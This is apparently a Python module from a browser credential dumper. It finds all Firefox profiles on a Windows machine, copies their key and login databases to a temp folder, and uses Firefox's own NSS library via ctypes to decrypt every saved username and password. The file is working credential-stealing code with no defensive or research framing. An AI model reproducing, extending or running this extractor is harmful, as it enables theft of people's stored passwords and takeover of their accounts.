import os
import json
import shutil
import base64
import ctypes
import sys
from ctypes import wintypes, Structure, POINTER, c_void_p, c_uint, c_int, c_char_p, cast
from typing import Dict, List, Optional
from utils.config import BrowserType
from utils.common import get_env_variable

# NSS Types
class SECItem(Structure):
    _fields_ = [
        ('type', c_uint),
        ('data', c_void_p), # unsigned char*
        ('len', c_uint)
    ]

class FirefoxExtractor:
    def __init__(self):
        self.browser_type = BrowserType.FIREFOX
        self.profiles = []
        self.nss_lib = None
        self.nspr_lib = None
        self.is_nss_initialized = False
        
    def _get_profiles(self):
        """Read profiles.ini to find all profiles."""
        self.profiles = []
        app_data = get_env_variable("APPDATA")
        if not app_data: return
        
        base_path = os.path.join(app_data, r"Mozilla\Firefox")
        ini_path = os.path.join(base_path, "profiles.ini")
        
        if not os.path.exists(ini_path):
            print(f"[-] profiles.ini not found at {ini_path}")
            return
        
        # print(f"[*] Found profiles.ini at {ini_path}")
        
        current_profile = {}
        with open(ini_path, "r") as f:
            for line in f:
                line = line.strip()
                if line.startswith("[Profile"):
                    if current_profile and "Path" in current_profile:
                        self.profiles.append(self._filter_path(base_path, current_profile))
                    current_profile = {}
                elif line.startswith("Path="):
                    current_profile["Path"] = line.split("=", 1)[1]
                elif line.startswith("Name="):
                    current_profile["Name"] = line.split("=", 1)[1]
                elif line.startswith("IsRelative="):
                    current_profile["IsRelative"] = line.split("=", 1)[1]
                    
            if current_profile and "Path" in current_profile:
                 self.profiles.append(self._filter_path(base_path, current_profile))

    def _filter_path(self, base_path, profile):
        p = profile["Path"]
        is_relative = profile.get("IsRelative") == "1"
        
        if is_relative or not os.path.isabs(p):
            profile["Path"] = os.path.join(base_path, p.replace("/", "\\"))
        else:
            profile["Path"] = p.replace("/", "\\")
            
        return profile

    def _load_nss(self) -> bool:
        if self.nss_lib: return True
        
        # Try standard locations
        possible_paths = [
            r"C:\Program Files\Mozilla Firefox\nss3.dll",
            r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"
        ]
        
        nss_path = None
        for p in possible_paths:
            if os.path.exists(p):
                nss_path = p
                break
                
        if not nss_path:
            # Try to find via registry or generic search? 
            # For now return False
            print("[!] Could not find nss3.dll in standard locations.")
            return False
            
        try:
            # Need to load dependency directory first usually
            nss_dir = os.path.dirname(nss_path)
            os.add_dll_directory(nss_dir)
            
            self.nss_lib = ctypes.CDLL(nss_path)
            try:
                self.nspr_lib = ctypes.CDLL(os.path.join(nss_dir, "nspr4.dll"))
                self.nspr_lib.PR_GetError.restype = c_int
            except:
                print("[!] Failed to load nspr4.dll, detailed errors unavailable.")
            
            # Setup signatures
            # NSS_Init(char *configdir)
            self.nss_lib.NSS_Init.argtypes = [c_char_p]
            self.nss_lib.NSS_Init.restype = c_int
            
            # NSS_Shutdown()
            self.nss_lib.NSS_Shutdown.restype = c_int
            
            # PK11SDR_Decrypt(SECItem *data, SECItem *result, void *cx)
            self.nss_lib.PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]
            self.nss_lib.PK11SDR_Decrypt.restype = c_int
            
            return True
        except Exception as e:
            print(f"[!] Error loading NSS: {e}")
            return False

    def _init_nss(self, profile_path: str) -> bool:
        if not self._load_nss(): return False
        
        if self.is_nss_initialized:
            self.nss_lib.NSS_Shutdown()
            self.is_nss_initialized = False
            
        ret = self.nss_lib.NSS_Init(profile_path.encode('utf-8'))
        if ret != 0:
            return False
            
        self.is_nss_initialized = True
        return True
        
    def _decrypt_value(self, b64_data: str) -> Optional[str]:
        if not self.is_nss_initialized or not b64_data: return None
        
        try:
            encrypted_bytes = base64.b64decode(b64_data)
            
            inp = SECItem()
            inp.type = 0
            inp.data = cast(ctypes.create_string_buffer(encrypted_bytes), c_void_p)
            inp.len = len(encrypted_bytes)
            
            out = SECItem()
            
            # Decrypt
            ret = self.nss_lib.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None)
            
            if ret == 0:
                # Success
                decrypted_data = ctypes.string_at(out.data, out.len)
                return decrypted_data.decode('utf-8')
            else:
                err_code = 0
                if self.nspr_lib:
                    err_code = self.nspr_lib.PR_GetError()
                print(f"DEBUG: PK11SDR_Decrypt failed with ret={ret}, error={err_code}")
                return None
                
        except Exception as e:
            print(f"Decryption error: {e}")
            return None

    def extract_logins(self) -> List[Dict]:
        self._get_profiles()
        results = []
        
        for profile in self.profiles:
            original_path = profile["Path"]
            # Copy relevant files to temp to avoid locks and init NSS there
            temp_dir = os.path.join(os.environ["TEMP"], f"firefox_dump_{os.getpid()}")
            os.makedirs(temp_dir, exist_ok=True)
            
            try:
                # Needed files: key4.db, logins.json, cert9.db, pkcs11.txt
                has_key_db = False
                for f in ["key4.db", "logins.json", "cert9.db", "pkcs11.txt"]:
                    src = os.path.join(original_path, f)
                    dst = os.path.join(temp_dir, f)
                    if os.path.exists(src):
                        try:
                            # Use shutil for read locking workaround? 
                            # Or just open/write. File might be locked.
                            # We can try simple copy first.
                            shutil.copy2(src, dst)
                            if f == "key4.db": has_key_db = True
                        except Exception:
                            # If locked, try to read binary
                            try:
                                with open(src, "rb") as rf:
                                    data = rf.read()
                                with open(dst, "wb") as wf:
                                    wf.write(data)
                                if f == "key4.db": has_key_db = True
                            except:
                                pass # Failed to copy
                
                if not has_key_db:
                    # print(f"[!] key4.db not found for profile {profile.get('Name')}")
                    continue
                    
                # Init NSS on temp dir
                if self._init_nss(temp_dir):
                    logins_path = os.path.join(temp_dir, "logins.json")
                    if os.path.exists(logins_path):
                        print(f"[*] Extracting logins from {original_path}")
                        with open(logins_path, "r", encoding="utf-8") as f:
                            data = json.load(f)
                            
                        if "logins" in data:
                            for login in data["logins"]:
                                u = login.get("encryptedUsername")
                                p = login.get("encryptedPassword")
                                
                                dec_u = self._decrypt_value(u)
                                dec_p = self._decrypt_value(p)
                                
                                results.append({
                                    "hostname": login.get("hostname"),
                                    "username": dec_u if dec_u else "<encrypted>",
                                    "password": dec_p if dec_p else "<encrypted>"
                                })
                            
                            # Debug: print first result status
                            # if results: print(f"DEBUG: First result: {results[0]}")
                            
                else:
                    print(f"[!] Failed to initialize NSS for profile {profile.get('Name')}")

            except Exception as e:
                print(f"[!] Error processing profile {profile.get('Name')}: {e}")
            finally:
                if self.is_nss_initialized:
                    self.nss_lib.NSS_Shutdown()
                    self.is_nss_initialized = False
                # Cleanup temp
                try:
                    shutil.rmtree(temp_dir)
                except: pass
                
        return results

